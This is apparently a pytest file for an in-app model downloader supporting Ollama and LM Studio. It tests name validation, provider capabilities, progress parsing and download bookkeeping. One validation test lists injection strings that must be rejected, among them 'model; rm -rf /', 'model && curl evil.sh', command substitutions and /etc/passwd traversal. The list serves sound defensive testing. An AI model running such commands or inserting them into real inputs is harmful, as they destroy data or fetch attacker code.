"""Installing a model from inside the app.

Getting a model used to be the one setup step that sent you out of a local-first
tool and into a terminal. These tests pin the two things that make doing it from
a web request safe rather than convenient: a model name reaches an argv, and a
provider that *cannot* install has to say so instead of offering a button that
fails.

Nothing here reaches the network or spawns a process. The Ollama path is driven
by a fake stream, and the LM Studio path is tested at its parsing seams.
"""

from __future__ import annotations

import io
import threading
import time

import pytest

from src.core.llm.downloader import (
    DownloadState,
    ModelDownloader,
    ProviderNotDownloadable,
    _iter_progress_lines,
    _lms_error,
    _ollama_error,
    is_valid_model_name,
)


# --------------------------------------------------------------------------- #
# Name validation — this string becomes an argv element
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize(
    "name",
    [
        "qwen2.5:3b",
        "nomic-embed-text:latest",
        "lmstudio-community/Qwen2.5-1.5B-Instruct-GGUF",
        "qwen/qwen3.5-9b@q8_0",
        "https://huggingface.co/lmstudio-community/Qwen2.5-1.5B-Instruct-GGUF",
    ],
)
def test_real_model_names_are_accepted(name: str) -> None:
    assert is_valid_model_name(name)


@pytest.mark.parametrize(
    "name",
    [
        "--help",
        "-o/etc/passwd",
        "",
        "model; rm -rf /",
        "model && curl evil.sh",
        "model$(whoami)",
        "model`id`",
        "../../etc/passwd",
        "model\nsecond",
        "model with spaces",
        "https://evil.example.com/lmstudio-community/x",
        "http://huggingface.co/a/b",
    ],
)
def test_names_that_could_change_the_command_are_rejected(name: str) -> None:
    """A leading dash is the whole flag-injection story for `lms get <name>`.

    Requiring an alphanumeric first character closes it without a second guard,
    and the charset closes shell metacharacters even though nothing here uses a
    shell.
    """
    assert not is_valid_model_name(name)


def test_a_name_that_is_merely_long_is_rejected_rather_than_truncated() -> None:
    assert not is_valid_model_name("a" * 400)


# --------------------------------------------------------------------------- #
# What each provider can actually do
# --------------------------------------------------------------------------- #
def test_a_hosted_gateway_offers_no_download_and_says_why() -> None:
    capability = ModelDownloader().capability("openai")
    assert capability["can_download"] is False
    assert capability["can_delete"] is False
    assert "nothing to download" in capability["reason"]


def test_ollama_can_both_install_and_remove() -> None:
    capability = ModelDownloader().capability("ollama")
    assert capability == {"provider": "ollama", "can_download": True, "can_delete": True, "reason": ""}


def test_lmstudio_without_its_cli_reports_the_reason_not_a_broken_button(monkeypatch) -> None:
    monkeypatch.setattr("src.core.llm.downloader.lms_executable", lambda: None)
    capability = ModelDownloader().capability("lmstudio")
    assert capability["can_download"] is False
    assert "lms" in capability["reason"] or "container" in capability["reason"]


def test_lmstudio_can_install_but_not_delete(monkeypatch) -> None:
    """`lms` has no delete verb. Claiming otherwise would give the UI a button
    whose only possible outcome is an error.
    """
    monkeypatch.setattr("src.core.llm.downloader.lms_executable", lambda: "/usr/bin/lms")
    capability = ModelDownloader().capability("lmstudio")
    assert capability["can_download"] is True
    assert capability["can_delete"] is False


def test_deleting_on_lmstudio_refuses_rather_than_calling_ollamas_api(monkeypatch) -> None:
    monkeypatch.setattr("src.core.llm.downloader.lms_executable", lambda: "/usr/bin/lms")
    with pytest.raises(ProviderNotDownloadable):
        ModelDownloader().remove("lmstudio", "some-model")


def test_starting_on_a_gateway_refuses_before_any_thread_is_created() -> None:
    downloader = ModelDownloader()
    with pytest.raises(ProviderNotDownloadable):
        downloader.start("openai", "gpt-4o")
    assert downloader.list() == []


def test_an_invalid_name_is_rejected_before_the_provider_is_consulted() -> None:
    with pytest.raises(ValueError, match="model name"):
        ModelDownloader().start("ollama", "--version")


# --------------------------------------------------------------------------- #
# Progress reporting
# --------------------------------------------------------------------------- #
def test_percent_is_none_while_nothing_measurable_has_been_reported() -> None:
    """A bar pinned at 0% reads as broken; "Resolving" reads as working."""
    assert DownloadState(provider="ollama", model="m").percent is None


def test_percent_comes_from_bytes_when_the_provider_reports_them() -> None:
    state = DownloadState(provider="ollama", model="m", completed_bytes=250, total_bytes=1000)
    assert state.percent == 25.0


def test_percent_comes_from_a_reported_percentage_when_there_are_no_bytes() -> None:
    state = DownloadState(provider="lmstudio", model="m", percent_override=42.5)
    assert state.percent == 42.5


def test_a_completed_download_reads_100_even_if_the_last_frame_was_missed() -> None:
    state = DownloadState(provider="ollama", model="m", status="completed", completed_bytes=1, total_bytes=1000)
    assert state.percent == 100.0


# --------------------------------------------------------------------------- #
# Ollama: the streaming pull
# --------------------------------------------------------------------------- #
class _FakeResponse:
    def __init__(self, lines: list[str], status_code: int = 200, text: str = "") -> None:
        self._lines = lines
        self.status_code = status_code
        self.text = text

    def iter_lines(self):
        yield from self._lines

    def read(self) -> None:
        return None

    def __enter__(self):
        return self

    def __exit__(self, *exc) -> None:
        return None


class _FakeClient:
    def __init__(self, response: _FakeResponse) -> None:
        self._response = response

    def stream(self, *_args, **_kwargs):
        return self._response

    def __enter__(self):
        return self

    def __exit__(self, *exc) -> None:
        return None


def _drive_ollama(monkeypatch, lines: list[str], **response_kwargs) -> DownloadState:
    import httpx

    response = _FakeResponse(lines, **response_kwargs)
    monkeypatch.setattr(httpx, "Client", lambda **_kwargs: _FakeClient(response))
    state = DownloadState(provider="ollama", model="qwen2.5:3b")
    ModelDownloader()._pull_ollama(state, threading.Event())
    return state


def test_ollama_byte_counts_become_progress(monkeypatch) -> None:
    state = _drive_ollama(
        monkeypatch,
        [
            '{"status":"pulling manifest"}',
            '{"status":"pulling abc123","digest":"abc123","total":1000,"completed":400}',
            '{"status":"success"}',
        ],
    )
    assert (state.completed_bytes, state.total_bytes) == (400, 1000)
    assert state.detail == "success"


def test_a_partial_line_does_not_abort_the_pull(monkeypatch) -> None:
    """Ollama emits NDJSON; a truncated frame is a parsing problem, not a
    download failure, and dropping the whole pull for one would be wrong.
    """
    _drive_ollama(
        monkeypatch,
        ['{"status":"pulling manifest"}', '{"status":"pull', "", '{"status":"success"}'],
    )


def test_a_stream_that_ends_without_success_is_a_failure_not_a_completion(monkeypatch) -> None:
    """A truncated pull leaves a partial blob that is not a usable model.
    Reporting it as installed would put a broken name in the picker.
    """
    with pytest.raises(RuntimeError, match="closed before the download finished"):
        _drive_ollama(monkeypatch, ['{"status":"pulling manifest"}'])


def test_an_error_reported_in_band_is_raised(monkeypatch) -> None:
    """Ollama sends HTTP 200 first and only then discovers the model is absent,
    so the status code alone never reveals this failure.
    """
    with pytest.raises(RuntimeError, match="no such model"):
        _drive_ollama(monkeypatch, ['{"status":"pulling manifest"}', '{"error":"no such model"}'])


def test_an_http_error_is_raised_with_the_providers_own_words(monkeypatch) -> None:
    with pytest.raises(RuntimeError, match="ollama.com/library"):
        _drive_ollama(
            monkeypatch,
            [],
            status_code=404,
            text='{"error":"model \'nope\' not found"}',
        )


def test_cancelling_stops_the_stream_before_it_reports_success(monkeypatch) -> None:
    """The worker only stops reading; `_run` owns the terminal state, so a
    cancelled pull must not be mistaken for a finished one.
    """
    import httpx

    response = _FakeResponse(['{"status":"pulling manifest"}', '{"status":"success"}'])
    monkeypatch.setattr(httpx, "Client", lambda **_kwargs: _FakeClient(response))
    state = DownloadState(provider="ollama", model="qwen2.5:3b")
    cancel = threading.Event()
    cancel.set()
    ModelDownloader()._pull_ollama(state, cancel)
    assert state.detail == ""


def test_not_found_is_translated_into_something_actionable() -> None:
    message = _ollama_error('{"error":"file does not exist"}', "qwn2.5:3b")
    assert "qwn2.5:3b" in message and "ollama.com/library" in message


# --------------------------------------------------------------------------- #
# LM Studio: reading a redrawn progress line
# --------------------------------------------------------------------------- #
def test_progress_is_read_from_carriage_returns_not_only_newlines() -> None:
    """`lms` redraws one line with \\r. Iterating the stream by line would block
    until a newline that never arrives, so the bar would never move.
    """
    stream = io.StringIO("Resolving...\rDownloading 10%\rDownloading 90%\nDone\n")
    assert list(_iter_progress_lines(stream)) == [
        "Resolving...",
        "Downloading 10%",
        "Downloading 90%",
        "Done",
    ]


def test_a_final_fragment_without_a_terminator_is_still_yielded() -> None:
    assert list(_iter_progress_lines(io.StringIO("Downloading 50%"))) == ["Downloading 50%"]


def test_the_error_line_is_preferred_over_the_last_spinner_frame() -> None:
    tail = ["Resolving...", "Error: The artifact does not exist", "⠋ Resolving download plan..."]
    assert _lms_error(tail).startswith("Error: The artifact does not exist")


def test_a_failure_with_no_output_at_all_still_says_something() -> None:
    assert _lms_error([]) == "LM Studio could not download that model."


# --------------------------------------------------------------------------- #
# Bookkeeping
# --------------------------------------------------------------------------- #
def test_two_downloads_on_one_provider_are_refused_not_queued_silently(monkeypatch) -> None:
    """Two multi-gigabyte pulls contend for the same disk and the same uplink,
    and both finish later than they would have done in sequence.
    """
    downloader = ModelDownloader()
    monkeypatch.setattr(downloader, "_pull_ollama", lambda state, cancel: cancel.wait(5))
    downloader.start("ollama", "first-model")
    with pytest.raises(ProviderNotDownloadable, match="already running"):
        downloader.start("ollama", "second-model")
    downloader.cancel("ollama", "first-model")


def test_asking_twice_for_the_same_model_returns_the_running_download(monkeypatch) -> None:
    downloader = ModelDownloader()
    monkeypatch.setattr(downloader, "_pull_ollama", lambda state, cancel: cancel.wait(5))
    first = downloader.start("ollama", "qwen2.5:3b")
    second = downloader.start("ollama", "qwen2.5:3b")
    assert first is second
    downloader.cancel("ollama", "qwen2.5:3b")


def test_a_finished_download_is_swept_so_the_list_is_not_a_history_log() -> None:
    downloader = ModelDownloader()
    key = ("ollama", "qwen2.5:3b")
    downloader._states[key] = DownloadState(
        provider="ollama",
        model="qwen2.5:3b",
        status="completed",
        finished_at=time.time() - 10_000,
    )
    assert downloader.list() == []


def test_a_download_that_raises_is_reported_not_left_hanging(monkeypatch) -> None:
    """A thread that dies silently leaves a row stuck on "downloading" forever."""
    downloader = ModelDownloader()

    def explode(state, cancel):
        raise RuntimeError("disk full")

    monkeypatch.setattr(downloader, "_pull_ollama", explode)
    state = downloader.start("ollama", "qwen2.5:3b")
    for _ in range(200):
        if state.is_terminal:
            break
        time.sleep(0.01)
    assert state.status == "failed"
    assert state.error == "disk full"
    assert state.finished_at is not None


def test_cancelling_something_that_is_not_running_is_not_an_error() -> None:
    assert ModelDownloader().cancel("ollama", "never-started") is False


def test_a_terminal_download_always_carries_a_finish_time() -> None:
    """The sweep reads a missing `finished_at` as zero -- i.e. finished long
    ago. If status could flip to terminal before the timestamp was written, a
    poll landing in that window would sweep the row and the user would watch
    their failed download disappear instead of seeing why it failed.
    """
    downloader = ModelDownloader()
    state = DownloadState(provider="ollama", model="qwen2.5:3b")
    downloader._states[("ollama", "qwen2.5:3b")] = state
    state.finish("failed", "disk full")

    assert state.finished_at is not None
    assert downloader.list()[0]["error"] == "disk full"


def test_a_download_completing_refreshes_the_model_list(monkeypatch) -> None:
    """Otherwise the model the user just installed does not appear until the
    registry's own TTL happens to expire.
    """
    invalidated: list[str] = []
    monkeypatch.setattr(
        "src.core.llm.downloader.model_registry.invalidate",
        lambda provider=None: invalidated.append(provider),
    )
    downloader = ModelDownloader()
    monkeypatch.setattr(downloader, "_pull_ollama", lambda state, cancel: None)
    state = downloader.start("ollama", "qwen2.5:3b")
    for _ in range(200):
        if state.is_terminal:
            break
        time.sleep(0.01)
    assert state.status == "completed"
    assert invalidated == ["ollama"]
